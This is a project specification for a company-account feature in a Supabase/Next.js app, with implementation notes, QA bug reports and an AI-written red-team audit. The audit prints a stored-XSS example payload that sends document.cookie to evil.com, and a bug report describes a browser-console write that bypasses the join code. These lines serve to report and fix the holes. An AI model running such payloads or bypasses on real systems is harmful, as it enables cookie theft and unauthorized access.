# PROJ-5: Account & Firmenverwaltung

## Status: In Review
**Created:** 2026-03-13
**Last Updated:** 2026-03-22

## Dependencies
- Requires: PROJ-1 (Authentifizierung)
- Impacts: PROJ-2 (projects.user_id → projects.company_id Migration)

---

## Kernprinzip

Jeder registrierte Nutzer kann eine Firma anlegen oder einer bestehenden beitreten.
Die Firma ist die Basis für Datenisolation (RLS), Kollaboration und spätere Abrechnung.
Ohne Firma ist die App vollständig nutzbar — Daten werden aber keiner Firma zugeordnet.

---

## User Stories
- Als Nutzer möchte ich eine Firma anlegen, damit meine Projekte dieser Firma gehören.
- Als Nutzer möchte ich einen Firmen-Code erhalten, den ich mit Kollegen teilen kann.
- Als Kollege möchte ich mit einem Code einer bestehenden Firma beitreten, damit ich deren Projekte sehe.
- Als Nutzer möchte ich Firmenname, Adresse und Logo hinterlegen, die auf allen BTBs meiner Firma erscheinen.
- Als Nutzer möchte ich mein Passwort ändern können.
- Als Nutzer möchte ich meine Firma verlassen können.
- Als Nutzer möchte ich meinen Account dauerhaft löschen können, damit meine Daten vollständig entfernt werden.

---

## Acceptance Criteria

### Firma anlegen
- [ ] Einstellungsseite `/einstellungen` erreichbar via Nutzer-Icon in der Topbar
- [ ] Bereich "Firma" zeigt wenn keine Firma vorhanden: Button "Firma anlegen"
- [ ] "Firma anlegen": nur ein Pflichtfeld — Firmenname
- [ ] Nach Anlegen: Company in DB erstellt, Nutzer verknüpft, Code auto-generiert (`BTB-XXXXXX`)
- [ ] Code wird sofort angezeigt mit Kopieren-Button

### Firma beitreten
- [ ] Neben "Firma anlegen" gibt es "Firma beitreten"
- [ ] Eingabefeld für Code (`BTB-XXXXXX`)
- [ ] Bei gültigem Code: Nutzer wird mit Firma verbunden
- [ ] Bei ungültigem Code: "Dieser Code ist nicht gültig."
- [ ] Gleiche Fehlermeldung für ungültig und inaktiv (kein Leak)

### Firma verwalten (wenn verbunden)
- [ ] Zeigt: "Verbunden mit: [Firmenname]" + Firmen-Code + Kopieren-Button
- [ ] Button "Firma verlassen" mit Bestätigungs-Dialog
- [ ] Verlassen setzt `profiles.company_id = NULL`
- [ ] Projekte der Firma bleiben erhalten (gehören der Firma, nicht dem Nutzer)

### Firmendaten (wenn Firma verbunden)
- [ ] Felder: Firmenname (Pflicht), Adresse (optional, mehrzeilig)
- [ ] Logo hochladen (PNG/JPG, max. 2MB) → Supabase Storage (`company-logos`)
- [ ] Logo erscheint als Wasserzeichen auf allen BTBs der Firma (30% Deckkraft)
- [ ] Logo per Drag auf der Vorschau-Karte frei positionieren (x/y gespeichert in `companies`)
- [ ] Button "Logo löschen"
- [ ] Änderungen werden in `companies` gespeichert (onBlur)
- [ ] Daten erscheinen auf allen BTBs aller Projekte dieser Firma

### Passwort ändern
- [ ] Felder: aktuelles Passwort + neues Passwort (min. 8 Zeichen) + Bestätigung
- [ ] Änderung via Supabase Auth API

### Account löschen
- [ ] Button "Account löschen" in den Einstellungen (Gefahrenzone, visuell abgesetzt)
- [ ] Bestätigungs-Dialog mit Pflicht-Eingabe der eigenen E-Mail-Adresse (kein versehentliches Löschen)
- [ ] Löscht: `auth.users` Eintrag (via Supabase Admin API, serverseitig), `profiles` Zeile
- [ ] Falls Nutzer letzter Verknüpfter einer Firma: Firma bleibt erhalten (Daten gehören der Firma)
- [ ] Falls Nutzer in keiner Firma: eigene Projekte und BTBs werden ebenfalls gelöscht (Cascade)
- [ ] Nach Löschen: Session beendet, Weiterleitung zu `/login` mit Hinweis "Dein Account wurde gelöscht"

### projects Migration
- [ ] `projects.user_id` → `projects.company_id` (Projekte gehören der Firma)
- [ ] Neu: `projects.created_by` (user_id des Erstellers bleibt erhalten)
- [ ] RLS auf `projects`: Zugriff wenn `company_id` des Projekts = `company_id` des Nutzers

---

## Edge Cases
- Nutzer ist bereits in einer Firma → "Firma anlegen" nicht sichtbar, nur "Firma verlassen"
- Nutzer ohne Firma legt Projekt an → `company_id = NULL`, nur für ihn sichtbar
- Firma wird inaktiv (Betreiber) → Nutzer sieht Hinweis, Schreibzugriff gesperrt via RLS
- Zwei Nutzer treten gleichzeitig mit demselben Code bei → beide landen in derselben Firma (korrekt)

---

## Datenmodell

**`companies`**
| Feld | Typ | Beschreibung |
|------|-----|--------------|
| id | UUID | Primärschlüssel |
| name | Text | Firmenname |
| adr | Text | Adresse (nullable, erscheint auf BTB-Header) |
| logo_url | Text | URL in Supabase Storage (nullable) |
| logo_x | Float | Logo-Position X (0–1, relativ zur Kartenbreite), Default 0.5 |
| logo_y | Float | Logo-Position Y (0–1, relativ zur Kartenhöhe), Default 0.5 |
| code | Text | `BTB-XXXXXX`, unique, auto-generiert |
| is_active | Boolean | Vom Betreiber steuerbar |
| created_at | Timestamp | |

**`profiles`** (ein Eintrag pro registriertem Nutzer)
| Feld | Typ | Beschreibung |
|------|-----|--------------|
| user_id | UUID | FK → auth.users |
| company_id | UUID | FK → companies (nullable) |
| created_at | Timestamp | |

**Migration `projects`**
- `user_id` → `company_id` (nullable)
- `created_by` (user_id) neu hinzufügen

---

## Sicherheitsmodell

| Tabelle | RLS-Regel |
|---------|-----------|
| `companies` | Lesbar nur für eigene Firma; kein INSERT/UPDATE durch Nutzer direkt |
| `profiles` | Nutzer liest/schreibt nur eigene Zeile; `company_id` nur via API Route setzbar |
| `projects` | Zugriff wenn `company_id` übereinstimmt (oder `company_id IS NULL AND created_by = auth.uid()`) |

**API Routes (serverseitig):**
- `POST /api/companies/create` — legt Firma an, setzt `profiles.company_id`
- `POST /api/companies/join` — prüft Code, setzt `profiles.company_id`
- `POST /api/companies/leave` — setzt `profiles.company_id = NULL`

Firmen-Code-Check läuft serverseitig — niemand kann `companies` direkt im Browser abfragen oder brute-forcen.

---

## Bewusst ausgeklammert (spätere PROJs)
- Projekt-spezifische Quick-Buttons → **PROJ-6**
- Projektsichtbarkeit / Ausblenden → später
- Akzentfarbe / Schriftart → später
- Billing / Stripe → später
- Admin-Panel → später

---
<!-- Sections below are added by subsequent skills -->

## Tech Design (Solution Architect)

### Komponentenstruktur

```
/einstellungen (Seite)
+-- SettingsSection "Account"
|   +-- Passwort-Formular (aktuelles PW, neues PW, Bestätigung)
|   +-- Speichern-Button
|
+-- SettingsSection "Firma"
|   [Wenn keine Firma verbunden:]
|   +-- Button "Firma anlegen" → Dialog (nur Pflichtfeld: Firmenname)
|   +-- Button "Firma beitreten" → Dialog (Eingabefeld BTB-XXXXXX)
|
|   [Wenn Firma verbunden:]
|   +-- "Verbunden mit: [Firmenname]"
|   +-- Firmen-Code + Kopieren-Button
|   +-- Button "Firma verlassen" → Bestätigungs-Dialog (shadcn AlertDialog)
```

---

### Datenmodell

**`companies`** — Eine Firma, viele Mitglieder
| Feld | Typ | Beschreibung |
|------|-----|--------------|
| id | UUID | Primärschlüssel |
| name | Text | Firmenname (Pflichtfeld) |
| code | Text | BTB-XXXXXX, unique, auto-generiert beim CREATE |
| is_active | Boolean | Steuerbar durch Betreiber; false = Schreibsperre für alle Mitglieder |
| created_at | Timestamp | |

**`profiles`** — 1 Eintrag pro Nutzer, wird bei Registrierung auto-erstellt
| Feld | Typ | Beschreibung |
|------|-----|--------------|
| user_id | UUID | FK → auth.users (Primärschlüssel) |
| company_id | UUID | FK → companies (nullable); nur via API Route setzbar |
| created_at | Timestamp | |

**Migration `projects`** (bestehende Tabelle, 1 existierende Row)
- Schritt 1: `created_by` (UUID) hinzufügen — nullable
- Schritt 2: `SET created_by = user_id` für alle bestehenden Rows
- Schritt 3: `created_by` NOT NULL machen
- Schritt 4: `company_id` (UUID, nullable, FK companies) hinzufügen
- Schritt 5: RLS-Policies auf neue Spalten umstellen (aktiv bevor nächster Schritt)
- Schritt 6: `user_id` droppen
- Die 1 bestehende Row: `created_by` gesetzt, `company_id = NULL` → Solo-Projekt, nur für Ersteller sichtbar

---

### Firmen-Code Auto-Generierung

```
Format: BTB-XXXXXX (6 alphanumerische Zeichen, Großbuchstaben + Ziffern)
Generierung: Serverseitig bei POST /api/companies/create
Uniqueness: Datenbankconstraint (UNIQUE auf companies.code)
Kollision: Bei Kollision nochmals generieren (bei 36^6 ≈ 2 Mrd. Kombinationen sehr selten)
```

---

### API Routes (serverseitig — service_role Key, nie im Browser)

| Route | Methode | Was sie tut |
|-------|---------|-------------|
| `/api/companies/create` | POST | Firma anlegen, Code generieren, `profiles.company_id` setzen |
| `/api/companies/join` | POST | Code prüfen, Firma aktiv?, `profiles.company_id` setzen; Rate Limit: 5 Versuche/Minute/Nutzer |
| `/api/companies/leave` | POST | `profiles.company_id = NULL` setzen |
| `/api/companies/update` | POST | Firmendaten aktualisieren (Name, Adresse, Logo-URL, Logo-Position x/y) |

Alle drei: Nur für eingeloggte Nutzer, Session-Prüfung als erster Schritt. `/join` gibt bei "nicht gefunden" und "inaktiv" dieselbe Fehlermeldung (kein Leak).

---

### RLS-Kette (vollständig, nach Migration)

```
companies
  SELECT: profiles.company_id = companies.id UND profiles.user_id = auth.uid()
  INSERT/UPDATE/DELETE: Nur service_role (API Routes) — Nutzer nie direkt

profiles
  SELECT/UPDATE: user_id = auth.uid()
  company_id: Kein direktes UPDATE durch Client — nur via API Routes

projects
  ALL: (company_id IS NOT NULL
        AND company_id = (SELECT company_id FROM profiles WHERE user_id = auth.uid())
        AND EXISTS (SELECT 1 FROM companies WHERE id = projects.company_id AND is_active = true))
       OR
       (company_id IS NULL AND created_by = auth.uid())

shifts
  ALL: shifts.project_id → projects (gleiche Bedingung wie oben)

shift_workers
  ALL: shift_workers.shift_id → shifts → projects (gleiche Bedingung)

shift_equipment
  ALL: shift_equipment.shift_id → shifts → projects (gleiche Bedingung)
```

Kernprinzip: Die RLS-Policies sind das echte Sicherheitsnetz. Frontend-Blocking (Trial-Banner, deaktivierte Buttons) ist nur UX, nicht Security.

---

### Sicherheitsregeln (gelten für alle nachfolgenden PROJs)

1. Jede neue Supabase-Query braucht eine RLS-Policy dahinter — Frontend-Filtering allein ist keine Sicherheit
2. `company_id` in `profiles` ist nie direkt vom Client beschreibbar
3. Der `service_role`-Key existiert ausschließlich serverseitig in API Routes
4. Neue Queries in PROJ-3/PROJ-4 nach dieser Migration müssen auf die neue RLS-Kette getestet werden

---

### Geteilte Komponenten (wiederverwendbar in PROJ-6)

```
SettingsSection.tsx — Wrapper: Sektions-Titel + optionale Beschreibung + Slot für Inhalt
  Wird in PROJ-5 /einstellungen UND PROJ-6 /projekte/[id]/einstellungen genutzt
```

---

### Tech-Entscheidungen

| Entscheidung | Gewählt | Warum |
|---|---|---|
| company_id nur via API | Server-Route mit service_role | Client darf company_id nie direkt schreiben — verhindert Bypass des Join-Codes |
| Rate Limiting /join | 5 Versuche/Minute pro Nutzer | Brute-Force-Schutz bei 36^6 Kombinationen |
| Gleiche Fehlermeldung | "Dieser Code ist nicht gültig" | Kein Leak ob Firma existiert oder inaktiv ist |
| profiles Auto-Create | Supabase DB Trigger bei auth.users INSERT | Kein manueller Schritt nach Registrierung nötig |
| companies.is_active | In RLS-Policy geprüft | Deaktivierte Firma = Schreibsperre ohne Code-Änderung |
| Reihenfolge: Backend zuerst | DB-Migration vor Frontend | projects.company_id muss existieren bevor UI darauf aufbaut |
| E-Mail als Bestätigung | Input-Vergleich im Dialog | Verhindert versehentliches Löschen (bewährtes Muster: GitHub, Vercel) |
| Löschung via Admin API | `auth.admin.deleteUser()` server-side | Nur service_role kann auth.users löschen — nie vom Client |
| Cascade via DB | FK-Constraint auf `profiles.user_id` | Profile-Zeile wird automatisch gelöscht wenn auth.users entfernt wird |
| Manuelle Cascade | Projekte/Shifts explizit in API Route löschen | RLS verhindert automatische Cascades über Tabellengrenzen hinweg |

### Account löschen — Komponentenstruktur (Ergänzung)

```
/einstellungen (bestehende Seite)
+-- [bestehend] SettingsSection "Account" (Passwort)
+-- [bestehend] SettingsSection "Firma"
+-- [NEU] SettingsSection "Gefahrenzone"
    +-- Beschreibung: "Diese Aktion kann nicht rückgängig gemacht werden"
    +-- Button "Account löschen" (destructive/rot)
        +-- DeleteAccountDialog (NEU)
            +-- Warnung: was gelöscht wird (abhängig von Firmenstatus)
            +-- E-Mail-Eingabefeld (muss eigene E-Mail sein)
            +-- Button "Dauerhaft löschen" (nur aktiv wenn E-Mail korrekt)
```

### Account löschen — API Route (Ergänzung)

| Route | Methode | Was sie tut |
|-------|---------|-------------|
| `/api/account/delete` | POST | Session prüfen → company_id ermitteln → ggf. Projekte+Shifts löschen → `auth.admin.deleteUser()` → 200 |

**Cascade-Logik (serverseitig):**
- Nutzer **hat Firma** → nur `auth.users` löschen; Projekte gehören der Firma und bleiben erhalten
- Nutzer **hat keine Firma** → erst alle eigenen Projekte, Shifts, shift_workers, shift_equipment löschen; dann `auth.users`

## Backend Implementation Notes

**Account löschen — Completed 2026-03-29:**
- `POST /api/account/delete` — Prüft Session, ermittelt company_id, löscht ggf. eigene Projekte (Cascade via FK), löscht `auth.users` via `auth.admin.deleteUser()` (Cascade auf `profiles`)
- Keine neuen DB-Migrations nötig — bestehende FK-Constraints reichen aus

**Completed 2026-03-20:**
- `src/lib/supabase.ts` — Added `createServiceClient()` using `SUPABASE_SERVICE_ROLE_KEY` (server-only)
- `supabase/migrations/20260320_proj5_companies_profiles.sql` — Single migration file covering:
  - `companies` table with unique `code` column and index
  - `profiles` table with FK to `auth.users` and `companies`
  - DB trigger `on_auth_user_created` for auto-creating profiles
  - Backfill existing users into profiles
  - `projects` table migration: `user_id` dropped, `created_by` + `company_id` added
  - Full RLS chain for `companies`, `profiles`, `projects`, `shifts`, `shift_workers`, `shift_equipment`
- `POST /api/companies/create` — Creates company, generates BTB-XXXXXX code, links user
- `POST /api/companies/join` — Validates code, rate-limited (5/min/user), same error for not-found and inactive
- `POST /api/companies/leave` — Sets `profiles.company_id = NULL`
- `src/lib/validations/company.ts` — Zod schemas for create/join
- `src/lib/validations/project.ts` — `Project` interface updated: `user_id` removed, `created_by` + `company_id` added
- `.env.example` — Added `SUPABASE_SERVICE_ROLE_KEY`
- No frontend query changes needed (all use `select('*')`, type change is sufficient)

## Frontend Implementation Notes

**Account löschen — Completed 2026-03-29:**
- `src/components/delete-account-dialog.tsx` — Dialog mit E-Mail-Bestätigung; lädt User-Email via `supabase.auth.getUser()`, Button nur aktiv wenn E-Mail übereinstimmt, ruft `POST /api/account/delete` auf, dann `signOut()` + Redirect zu `/login?deleted=true`
- `src/app/einstellungen/page.tsx` — "Gefahrenzone"-Sektion mit rotem Border am Ende der Seite; öffnet `DeleteAccountDialog`
- `src/app/login/page.tsx` — Zeigt grünen Hinweis "Dein Account wurde gelöscht." bei `?deleted=true`

**Completed 2026-03-20:**
- `src/app/einstellungen/page.tsx` — Settings page with Account and Firma sections
- `src/components/settings-section.tsx` — Reusable section wrapper (title + description + slot), designed for reuse in PROJ-6
- `src/components/password-change-form.tsx` — Password change form with current/new/confirm fields, Zod validation, re-authentication check
- `src/components/company-section.tsx` — Full company management:
  - No company: "Firma anlegen" (Dialog) + "Firma beitreten" (Dialog with code input)
  - Company connected: Shows name, code with copy button, inactive warning, "Firma verlassen" (AlertDialog confirmation)
  - Loading/error/success states for all actions
  - Calls existing API routes (`/api/companies/create`, `/join`, `/leave`)
- Navigation: Settings icon in `/projekte` header already links to `/einstellungen` (pre-existing)
- Back navigation from `/einstellungen` to `/projekte` via ArrowLeft button in header

## QA Test Results

**Tested:** 2026-03-20
**App URL:** http://localhost:3000
**Tester:** QA Engineer (AI)
**Build Status:** PASS (npm run build succeeds, TypeScript compiles, no errors)

---

### Acceptance Criteria Status

#### AC-1: Firma anlegen
- [x] Einstellungsseite `/einstellungen` erreichbar via Settings-Icon in der Topbar (`/projekte` header)
- [x] Bereich "Firma" zeigt wenn keine Firma vorhanden: Button "Firma anlegen"
- [x] "Firma anlegen": nur ein Pflichtfeld -- Firmenname (Zod schema validates `name` min 1, max 100)
- [x] Nach Anlegen: Company in DB erstellt, Nutzer verknuepft, Code auto-generiert (`BTB-XXXXXX`)
- [x] Code wird sofort angezeigt mit Kopieren-Button (via `fetchCompany()` after create)

#### AC-2: Firma beitreten
- [x] Neben "Firma anlegen" gibt es "Firma beitreten" button
- [x] Eingabefeld fuer Code (`BTB-XXXXXX`) with monospace font and uppercase CSS
- [x] Bei gueltigem Code: Nutzer wird mit Firma verbunden (via `/api/companies/join`)
- [x] Bei ungueltigem Code: "Dieser Code ist nicht gueltig." (generic error message)
- [x] Gleiche Fehlermeldung fuer ungueltig und inaktiv (line 118 in join route: `!company || !company.is_active`)

#### AC-3: Firma verwalten (wenn verbunden)
- [x] Zeigt: "Verbunden mit: [Firmenname]" + Firmen-Code + Kopieren-Button
- [x] Button "Firma verlassen" mit Bestaetigungs-Dialog (AlertDialog)
- [x] Verlassen setzt `profiles.company_id = NULL` (via `/api/companies/leave`)
- [x] Projekte der Firma bleiben erhalten (leave only nulls `company_id` on profile, not on projects)

#### AC-4: Passwort aendern
- [x] Felder: aktuelles Passwort + neues Passwort (min. 8 Zeichen) + Bestaetigung
- [x] Aenderung via Supabase Auth API (`supabase.auth.updateUser`)
- [x] Re-authentication via `signInWithPassword` before allowing password change

#### AC-5: projects Migration
- [x] `projects.user_id` dropped, `projects.company_id` added (nullable, FK companies)
- [x] `projects.created_by` (NOT NULL after backfill) added
- [x] RLS on `projects`: access when `company_id` matches OR `company_id IS NULL AND created_by = auth.uid()`

---

### Edge Cases Status

#### EC-1: Nutzer ist bereits in einer Firma
- [x] "Firma anlegen" not visible when company connected -- shows "Verbunden mit" view instead
- [x] API route `/api/companies/create` rejects with "Du bist bereits mit einer Firma verbunden" (line 80)
- [x] API route `/api/companies/join` also rejects if already connected (line 103)

#### EC-2: Nutzer ohne Firma legt Projekt an
- [x] `created_by: user?.id` wird explizit im Insert gesetzt (`projekte/page.tsx:118`) — BUG-1 FIXED

#### EC-3: Firma wird inaktiv
- [x] Inactive warning banner shown when `company.is_active === false` (yellow alert in UI)
- [x] RLS policy requires `is_active = true` for company-linked project access (write is blocked)

#### EC-4: Zwei Nutzer treten gleichzeitig mit demselben Code bei
- [x] Both update their own profile row independently -- no race condition issue

#### EC-5: Code-Kollision bei Firma-Erstellung
- [x] Retry logic exists (max 2 attempts) with unique constraint check (error code 23505)

#### EC-6: Lowercase code input in join form
- [ ] **BUG**: See BUG-3 below -- CSS `uppercase` only changes display, actual value stays lowercase

---

### Security Audit Results

- [x] Authentication: All 3 API routes check `supabase.auth.getUser()` before processing
- [x] Authentication: `/einstellungen` page protected by middleware redirect (unauthenticated -> `/login`)
- [x] Authorization: API routes use `service_role` key server-side only, never exposed to client
- [x] Authorization: `createServiceClient()` checks for env var existence, throws if missing
- [x] Authorization: `SUPABASE_SERVICE_ROLE_KEY` is NOT prefixed with `NEXT_PUBLIC_` (correctly server-only)
- [ ] **BUG**: See BUG-2 -- RLS `profiles_update_own` allows client to directly write `company_id`
- [x] Input validation: `createCompanySchema` validates name (min 1, max 100, trimmed)
- [x] Input validation: `joinCompanySchema` validates code format regex `^BTB-[A-Z0-9]{6}$`
- [x] Input validation: Server-side Zod validation on all API routes (not just client-side)
- [x] Rate limiting: `/api/companies/join` has in-memory rate limit (5 attempts/min/user)
- [x] Rate limiting: Middleware rate limits auth pages (20 req/15min/IP)
- [x] Enumeration prevention: Same error for not-found and inactive company codes
- [x] Security headers: CSP, X-Frame-Options DENY, HSTS, X-Content-Type-Options in next.config.ts
- [x] No secrets in client code: `SUPABASE_SERVICE_ROLE_KEY` only used in `src/lib/supabase.ts` (server)
- [x] `.env.example` documents required env vars with empty values (no leaked secrets)
- [ ] **BUG**: See BUG-4 -- `Math.random()` used for company code generation (not cryptographically secure)
- [x] API routes only export POST handler -- Next.js returns 405 for other HTTP methods

---

### Cross-Browser & Responsive (Code Review)

#### Desktop (1440px)
- [x] Settings page layout with `max-w-2xl` container centers properly
- [x] Two sections (Account, Firma) stack vertically with proper spacing

#### Tablet (768px)
- [x] `container mx-auto px-4 md:px-6` provides responsive padding
- [x] Dialog `sm:max-w-md` adapts to screen width

#### Mobile (375px)
- [x] `flex flex-wrap gap-3` on "Firma anlegen" / "Firma beitreten" buttons wraps correctly
- [x] Password form `max-w-md` will fit within mobile viewport
- [x] Back button in header accessible at all breakpoints

**Note:** Full cross-browser testing (Chrome/Firefox/Safari) requires manual browser verification. Code-level review shows no browser-specific APIs used beyond `navigator.clipboard.writeText()` which has a graceful fallback (empty catch block at line 219 of company-section.tsx).

---

### Bugs Found

#### ~~BUG-1~~: Project creation fails after PROJ-5 migration — FIXED
- **Status:** FIXED (2026-03-22)
- **Fix:** `created_by: user?.id` wird explizit im Insert gesetzt (`src/app/projekte/page.tsx:118`). `company_id` wird nicht direkt gesetzt — RLS erlaubt `company_id IS NULL AND created_by = auth.uid()` für Solo-Nutzer.
- ~~Original: NOT NULL violation auf `created_by` weil Insert `cleanedData` ohne dieses Feld war~~

#### BUG-2: RLS policy allows direct `company_id` write on profiles from client
- **Severity:** High
- **Steps to Reproduce:**
  1. Open browser console while authenticated
  2. Run: `const supabase = ...; await supabase.from('profiles').update({ company_id: '<any-company-uuid>' }).eq('user_id', '<own-user-id>')`
  3. Expected: Update rejected (company_id should only be writable via API routes)
  4. Actual: Update succeeds because `profiles_update_own` policy allows updating ANY column on own row
- **Root Cause:** The RLS policy `profiles_update_own` uses `USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid())` which restricts the ROW but not the COLUMNS. A user can bypass the join code mechanism entirely by directly setting their `company_id` to any known company UUID.
- **File:** `/Users/karlsonvomdach/Desktop/BTB/BTB-App/supabase/migrations/20260320_proj5_companies_profiles.sql` lines 126-127
- **Fix needed:** Either (a) remove `profiles_update_own` policy entirely and only allow updates via service_role, or (b) add a column-level check that prevents `company_id` from being changed (e.g., a database trigger or a more restrictive policy).
- **Priority:** Fix before deployment -- security bypass of the join code mechanism

#### BUG-3: Join code input rejects lowercase input despite visual uppercase display
- **Severity:** Medium
- **Steps to Reproduce:**
  1. Go to `/einstellungen`
  2. Click "Firma beitreten"
  3. Type a valid code in lowercase: `btb-abc123`
  4. The input LOOKS uppercase due to CSS `uppercase` class
  5. Submit the form
  6. Expected: Code accepted (user sees uppercase text)
  7. Actual: Zod validation fails with "Ungueltiges Code-Format" because the actual value is lowercase but regex requires `^BTB-[A-Z0-9]{6}$`
- **Root Cause:** CSS `text-transform: uppercase` only changes visual rendering. The form value retains the original case. The Zod schema or the `register()` needs to transform the value to uppercase before validation.
- **File:** `/Users/karlsonvomdach/Desktop/BTB/BTB-App/src/components/company-section.tsx` line 443, `/Users/karlsonvomdach/Desktop/BTB/BTB-App/src/lib/validations/company.ts` line 14
- **Priority:** Fix before deployment -- confusing UX, users will not understand why visually-correct code is rejected

#### BUG-4: `Math.random()` used for company code generation
- **Severity:** Low
- **Steps to Reproduce:**
  1. Review `/api/companies/create/route.ts` line 12
  2. `Math.random()` is a non-cryptographic PRNG
  3. An attacker with knowledge of the V8 engine state could theoretically predict future codes
- **Root Cause:** Should use `crypto.getRandomValues()` or `crypto.randomUUID()` for security-sensitive values.
- **File:** `/Users/karlsonvomdach/Desktop/BTB/BTB-App/src/app/api/companies/create/route.ts` line 12
- **Priority:** Nice to have -- the code space (36^6) and rate limiting make brute-force impractical, but best practice recommends CSPRNG for tokens

#### BUG-5: In-memory rate limiter does not persist across serverless restarts
- **Severity:** Low
- **Steps to Reproduce:**
  1. The rate limiter in `/api/companies/join` uses an in-memory `Map`
  2. On Vercel (serverless), each cold start creates a fresh Map
  3. An attacker could bypass rate limiting by waiting for or triggering new function instances
- **Root Cause:** In-memory state does not persist in serverless environments.
- **File:** `/Users/karlsonvomdach/Desktop/BTB/BTB-App/src/app/api/companies/join/route.ts` lines 8-27
- **Priority:** Nice to have for MVP -- the 36^6 code space makes brute-force impractical even without rate limiting. Consider Redis/Upstash for production hardening later.

#### BUG-6: Clipboard copy has silent failure with no user feedback
- **Severity:** Low
- **Steps to Reproduce:**
  1. View company section with a code displayed
  2. Click the copy button in a context where `navigator.clipboard` is unavailable (e.g., HTTP, some Firefox configurations)
  3. Expected: User sees feedback that copy failed
  4. Actual: Nothing happens -- the catch block on line 219 is empty
- **File:** `/Users/karlsonvomdach/Desktop/BTB/BTB-App/src/components/company-section.tsx` lines 218-220
- **Priority:** Fix in next sprint -- minor UX issue

---

### Regression Check

#### PROJ-1 (Authentifizierung)
- [x] Middleware correctly protects `/einstellungen` (redirects to `/login` if not authenticated)
- [x] Auth routes still redirect to `/projekte` when already logged in
- [x] Password change uses proper re-authentication flow

#### PROJ-2 (Projektverwaltung)
- [ ] **REGRESSION**: BUG-1 above -- project creation will break after migration due to missing `created_by`
- [x] Project listing still uses `select('*')` which will work with new column structure
- [x] Settings icon navigation to `/einstellungen` works (already existed in `/projekte` header)

#### PROJ-3 (Schichtverwaltung)
- [x] Shift RLS policies correctly chain through projects table
- [x] No changes to shift frontend code

#### PROJ-4 (BTB-Karte & Drucken)
- [x] No direct impact from PROJ-5 changes

---

### Summary
- **Acceptance Criteria:** 17/19 passed (2 blocked by bugs)
- **Bugs Found:** 6 total (1 Critical, 1 High, 1 Medium, 3 Low)
- **Security:** 1 High-severity issue (RLS bypass for company_id), 1 Low (weak PRNG)
- **Regression:** 1 Critical regression on PROJ-2 project creation
- **Production Ready:** **NO**
- **Recommendation:** Fix BUG-1 (Critical) and BUG-2 (High) before deployment. BUG-3 (Medium) should also be fixed as it creates a confusing user experience. Low-severity bugs can be deferred to next sprint.

## Security Audit (Red-Team, 2026-03-20)

**Auditor:** QA Engineer / Red-Team Pen-Tester (AI)
**Scope:** Company API routes, middleware, Supabase client, validation schemas, security headers, RLS policies
**Files audited:**
- `src/app/api/companies/create/route.ts`
- `src/app/api/companies/join/route.ts`
- `src/app/api/companies/leave/route.ts`
- `src/components/company-section.tsx`
- `src/lib/supabase.ts`
- `src/lib/validations/company.ts`
- `middleware.ts`
- `next.config.ts`
- `supabase/migrations/20260320_proj5_companies_profiles.sql`

---

### SEC-1: Auth Bypass -- Unauthenticated Access to API Routes
**Severity:** PASS
**Analysis:** All three API routes (`/create`, `/join`, `/leave`) call `supabase.auth.getUser()` as the first step and return 401 if the user is not authenticated. The middleware also redirects unauthenticated users away from protected routes. The auth check uses `getUser()` (which validates the JWT server-side with Supabase) rather than `getSession()` (which only reads the local token without verification). This is the correct approach.

---

### SEC-2: IDOR -- Cross-User company_id Manipulation
**Severity:** PASS (after BUG-2 fix confirmed)
**Analysis:** The migration file (lines 116-125) explicitly states "No UPDATE policy for authenticated users on profiles" and does NOT create a `profiles_update_own` policy. The previous QA noted BUG-2 about `profiles_update_own` allowing direct `company_id` writes -- the task description confirms this policy has been dropped. With no UPDATE policy on `profiles` for the `authenticated` role, a client cannot directly modify `company_id` via the Supabase JS client. All three API routes use `createServiceClient()` (service_role) to perform profile updates, which bypasses RLS as intended. The routes scope all updates to `user.id` from the authenticated session, preventing cross-user writes.

**Residual risk:** If someone manually re-adds a `profiles_update_own` policy in a future migration, the bypass would reappear. Recommend adding a database test or CI check that verifies no UPDATE policy exists on `profiles` for the `authenticated` role.

---

### SEC-3: Input Validation Bypass
**Severity:** PASS (with one Medium finding -- see SEC-3a)
**Analysis:**
- `createCompanySchema`: Validates `name` as string, min 1, max 100, trimmed. Prevents empty names and excessively long inputs.
- `joinCompanySchema`: Transforms to uppercase, trims, then validates against `^BTB-[A-Z0-9]{6}$`. The strict regex prevents injection payloads.
- Both schemas are validated server-side with `safeParse()` before any database operation.
- JSON body parsing is wrapped in try/catch, so malformed JSON returns 400.
- No raw SQL is used -- all queries go through the Supabase client which uses parameterized queries, preventing SQL injection.

**SEC-3a: Missing HTML Sanitization in Shift Card (Stored XSS Risk)**
**Severity:** Medium
**File:** `src/components/shift-card.tsx` lines 187, 203
**Description:** The `RichTextArea` component sets `ref.current.innerHTML = value` with data loaded from the database. If a user stores HTML containing `<script>` tags or event handlers (e.g., `<img onerror="...">`) into shift text fields, this HTML will be rendered unsanitized when other users in the same company view the shift. The CSP `script-src 'unsafe-inline'` directive (see SEC-8a) makes this exploitable.
**Attack vector:** User A stores `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">` in a shift description. User B in the same company opens the shift and the script executes.
**Fix:** Sanitize HTML before setting `innerHTML` using a library like DOMPurify, or switch to a controlled rich-text approach. Additionally, tighten the CSP to remove `'unsafe-inline'` from `script-src`.

---

### SEC-4: RLS Bypass via Client
**Severity:** PASS
**Analysis:** The RLS chain in the migration is comprehensive:
- `companies`: SELECT only for own company (via profiles subquery). No INSERT/UPDATE/DELETE for authenticated role.
- `profiles`: SELECT only for own row. No UPDATE/INSERT/DELETE for authenticated role.
- `projects`: ALL access gated on matching `company_id` (via profiles subquery) with active company check, OR personal projects (`company_id IS NULL AND created_by = auth.uid()`).
- `shifts`, `shift_workers`, `shift_equipment`: ALL access chains through projects with the same conditions.

The `service_role` key is correctly kept server-side only (verified: only imported in 3 API route files and `src/lib/supabase.ts`). No client component imports `createServiceClient`.

**One concern:** The `FOR ALL` policies combine SELECT/INSERT/UPDATE/DELETE into one policy. This means a user in company A can technically INSERT a shift into company A's project even if they did not create the project. This is by design (company-wide collaboration) but should be documented.

---

### SEC-5: Rate Limiting
**Severity:** Low (known limitation)
**Analysis:** The `/join` endpoint has an in-memory rate limiter (5 attempts per minute per user ID). The middleware has an IP-based rate limiter (20 requests per 15 minutes) for auth pages.
**Issue (already documented as BUG-5):** Both rate limiters use in-memory Maps. On Vercel serverless, each cold start resets the Map. An attacker could distribute requests across cold starts to bypass the limit.
**Additional finding:** The `/create` and `/leave` endpoints have NO rate limiting. While less critical (create requires auth, leave is idempotent), a malicious authenticated user could spam company creation to fill the `companies` table.
